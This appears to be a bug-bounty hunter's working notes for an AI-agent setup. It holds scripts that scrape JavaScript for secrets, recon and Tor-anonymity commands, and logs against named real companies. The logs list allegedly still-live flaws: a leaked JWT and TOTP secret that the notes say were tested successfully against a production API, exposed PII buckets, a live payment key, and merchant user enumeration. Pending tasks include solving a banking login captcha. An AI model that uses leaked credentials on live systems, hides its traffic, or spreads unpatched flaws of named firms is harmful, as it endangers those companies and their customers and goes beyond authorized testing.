```bash
curl -sk "https://target.com/" | grep -oP 'src="([^"]+\.js[^"]*)"'
curl -sk "https://target.com/chunk.js" -o /tmp/analyze.js
```

### Pattern Searching
```python
import re
c = open("/tmp/analyze.js").read

# API endpoints
for m in re.findall(r'["\'](/v[12]/[^"\']+)["\']', c):
    print(f"Endpoint: {m}")

# API base URLs
for m in re.findall(r'(?:baseURL|apiUrl|BASE_URL)["\']?\s*[:=]\s*["\']([^"\']+)["\']', c):
    print(f"API Base: {m}")

# Secrets
for m in re.findall(r'(?:key|secret|token|api[_-]?key)[:=]["\']?([A-Za-z0-9_\-]{20,})["\']?', c, re.I):
    print(f"Secret: {m}")

# Routes
for m in re.findall(r'["\'](/[a-z-]+(?:/[a-z-]+)*)["\']', c):
    if any(x in m.lower for x in ['api', 'auth', 'order', 'admin']):
        print(f"Route: {m}")
```

### Next.js Specific
- Look for `__NEXT_DATA__` in HTML
- Check `_next/static/chunks/pages/`
- Check `_buildManifest.js` for route listing

---

# PART 18: CURRENT FINDINGS STATE

## Active Verifier Findings
| Pri | Company | Finding | Severity |
|-----|---------|---------|----------|
| 🥇 | Groww | GitHub Credential Leak ([REDACTED]/groww/.env.example) | CRITICAL 9.8 |
| 🥇 | Acko | S3 Pre-signed URL Generation (acko-partners-restricted) | CRITICAL |
| 🥇 | Acko | Employee PII via auth-saml (names, phones, emails) | CRITICAL |
| 🥈 | Acko | SAML SSO Enumeration (3 services) | HIGH |
| 🥈 | Acko | Fleetops CORS Wildcard (* + Kong) | HIGH |
| 🥈 | Mygate | Internal IP Leak (REDACTED_KNOWN_SECRET:8888) | HIGH |
| 🥉 | Acko | cx360v2 Actuator, New Relic Leak, Analytics CORS | MEDIUM |

## Active Hunter Findings (boat-lifestyle.com)
| Finding | Severity |
|---------|----------|
| S3 PII Leak (83 PDFs exposed) | CRITICAL 9.6 |
| Razorpay Live Key (REDACTED_RAZORPAY_LIVE_KEY) | CRITICAL 9.1 |
| Apache no TLS on test.boat-lifestyle.com | HIGH 7.5 |
| Warranty Test PDFs | HIGH |
| Mendix Constants Exposure | MEDIUM |
| Crewex Admin API | MEDIUM |
| Mendix SOAP/REST | MEDIUM |
| OTP Rate Limit | MEDIUM |
| GraphQL Introspection | MEDIUM |

---

# PART 19: COMMON PITFALLS

## Tool/Command Errors
| Pitfall | Fix |
|---------|-----|
| Tor config crash — deprecated options | Always `tor --verify-config` before restart |
| UFW kill switch kills all traffic | Never `ufw allow out to any port 443` — use `-m owner --uid-owner debian-tor` |
| iptables OUTPUT policy not verified | Check `iptables -L OUTPUT \| head -1` explicitly |
| grep/find in bash instead of Grep/Glob | Use Grep for content, Glob for patterns |
| cd + && vs workdir | Use `workdir` parameter |
| S3 bucket vs S3 website | `bucket.s3.amazonaws.com` = raw objects; `bucket.s3-website-region.amazonaws.com` = HTML website |
| crt.sh API returns empty | Have alternatives (Amass, Sublistr, DNS brute force) |
| BugBase title > 120 chars | Count before finalizing |
| BugBase URL field accepts only 1 URL | Use most impactful, list others in body |

## Verification Pitfalls
- Acko implemented WAF between discovery and verification — submit fast
- Locus fixed DNS leak + subdomain takeover between cycles — missed window
- Groww GitHub leak LIVE for 3+ years — highest urgency
- Source maps = highest-value recon target
- Design systems = second highest

## Reporting Pitfalls
- Title: `[VulnType] — [Endpoint] [Impact Summary]` ≤ 120 chars
- Include LIVE curl commands triager can copy-paste
- Show blocked vs bypassed endpoints side-by-side
- CVSS vector + severity = most credibility
- Always include CWE reference
- Steps must be reproducible by unfamiliar person
- Impact must be specific, not generic

---

# PART 20: MASTER VULNERABILITY PORTFOLIO (recon_reports/docs/)

## Executive Summary
| Metric | Count |
|--------|:-----:|
| Total Findings | 38 |
| Reports Submitted | 21 (across 6 programs) |
| Reports Ready | 7 |
| Triaged | 6 (all Acko) |
| Paid/Confirmed | 1 (Acko ₹10K — #92314958) |

## Acko (12 submitted) — Dashboard synced 2026-08-09
- **#92314958 PII Leak via Communications — TRIAGED High ✅ ₹10K** (the money one)
- #38724495 42 Internal Endpoints — TRIAGED Medium
- #45126578 Payin Orders DB Schema Leak — TRIAGED Medium
- #53636465 Payment/Financial Endpoints No Auth — TRIAGED Medium
- #45668255 S3 Presigned URL Generation — TRIAGED Medium
- #97945332 Job Scheduler DB Write — TRIAGED Low
- DUPLICATES (lost to first-mover): #47494133 Mass PII (Crit), #46577032 Bulk Ops 26K records (Crit), #38588311 Comm API bypass (High), #47762803 bike proposal PII (High)
- INVALID: #04923490 + #22994243 Segment Write Keys — Acko rejects key-only findings
- Lesson: FIRST-MOVER WINS on Acko. Same PII surface reported twice = dup. Submit fast.
- Additional infra: central-internal-tools, cx360v2, auth-saml (SAML SSO), vendor portal

## Groww (6 findings, 2 submitted)
- DNS Leak (8 Private IPs) — STILL LIVE
- Actuator/.env/.git — 403 confirms existence
- **CRITICAL**: GitHub Credential Leak — `[REDACTED]/groww` STILL PUBLIC
  - JWT (Issuer: apex-auth-prod-app, Role: auth-totp)
  - TOTP Secret: `REDACTED_KNOWN_SECRET`
  - AWS Lambda URL, Pushbullet Token
  - JWT returns 200 on api.groww.in — UCC 8454939871

## Scope-Verified Findings
- **Neon**: CSP misconfig + Sentry DSN leak, Keycloak OIDC exposed
- **OOS confirmed**: NBA webmail, Meesho GCS bucket, Twitter/X GCS, Shopify CDN

---

# PART 21: KEY COMMANDS & SHORTCUTS

```bash
# Anonymity
bash ~/session_start.sh
proxychains4 curl https://check.torproject.org/ | grep -o "Congratulations"
echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n' | nc 127.0.0.1 9051

# Quick recon
chaos -d target.com -o subs.txt && httpx -l subs.txt -ip -silent | sed -nE 's/.*\[([0-9.]+)\].*/\1/p' | sort -u > ip.txt

# Quick fuzzing
bash ~/scripts/passive_fuzzer.sh

# Multi-agent launch
bash ~/scripts/agents_launcher.sh

# Agent commands
opencode hunt <target>
opencode plan <target>
opencode verify <finding>
opencode report <finding>
opencode debug <issue>
opencode audit <codebase>
opencode memory <agent>

# Reporter
# Reporter: sricharan_99
# Email: REDACTED_KNOWN_SECRET
# Output: ~/recon_reports/bugbase_reports/BUGBASE_*.md
# Input: ~/recon_reports/verified_findings/READY_*
```

---

## Session 2026-07-06 - Large-Scale Reconnaissance

### What Was Done
1. **Mass subdomain recon**: subfinder on 6 HDFC domains → 2746 unique subdomains
2. **httpx probing**: 812 live hosts found (206 with HTTP 200)
3. **Deep dives on high-value targets**:
   - WebLogic (oracle.hdfc.bank.in) → 503 backend
   - ManageEngine Desktop Central (corporateportal.hdfc.bank.in) → 503 backend
   - Spring Boot Admin (remote.hdfc.bank.in) → 503 backend
   - CloudPanel (admin.hdfc.bank.in) → 503 backend
   - PHP-Fusion (access.hdfc.bank.in) → Radware blocked
   - OWA/SharePoint (owa.hdfc.bank.in) → timed out
4. **SMARTHUB Merchant (smarthub.biz.hdfc.bank.in)**:
   - Discovered user enumeration via forgot password AJAX endpoint
   - AJAX endpoint: `/merchantLogin.do` with `command=checkUserExist`
   - Response format: `vAuthFlag|attemptCount` (e.g., `Invalid|2`)
   - Allows enumerating valid merchant usernames/emails
   - Rate limited (10 min lockout after 0 attempts)
5. **BizExpress (netbankingforbusiness.hdfc.bank.in)**:
   - Angular SPA (Angular 17+)
   - Backend: Open Money platform (bankopen.co)
   - APIs: icp-api.bankopen.co, payments.open.money, uat-lending.bankopen.co
6. **Drupal API Portal (developer.hdfc.bank.in)**:
   - Drupal with custom theme, 200+ pages
   - Open partner registration with CAPTCHA
   - 4 API categories with documentation
7. **ENET**: Currently down (HTTP 000)
8. **CBX**: 000 timeout
9. **SME CLO**: 503

### New Findings Saved (3 total this session)
1. SMARTHUB_Merchant_User_Enumeration_20260706_*.md
2. BizExpress_Open_Money_API_Disclosure_20260706_*.md
3. API_Portal_Drupal_Discovery_20260706_*.md

### Total Files: 31 in unreported/

---

## Session 2026-07-06 (Late) — Exploitation Phase + BugBase Credentials

### Key Discoveries
1. **BugBase credentials page accessed**: Real ENET credentials (ISGINP46/REDACTED_KNOWN_SECRET, domain=ENETISG), CBX correct domain (cbxuat.hdfcbank.com:444), full scope list with 17 assets, 8 mobile APKs
2. **ENET hash verified with correct domain**: Login logic works, captcha still blocks
3. **CBX real domain**: cbxuat.hdfcbank.com:444 → F5 BigIP redirect to cbxuat.hdfcuat.bank.in:444
4. **S3 bucket expanded**: 8+ accessible paths found under open-frontend-bucket.s3.amazonaws.com
5. **SMARTHUB forgotPasswordStatus**: Better user enumeration via hidden form field
6. **30 total finding files** saved to unreported/

### Pending
- Download and decompile 8 mobile APKs
- Solve ENET captcha
- Check Lastmile, ENET MVC, SME CLO
- Register on Drupal API Portal
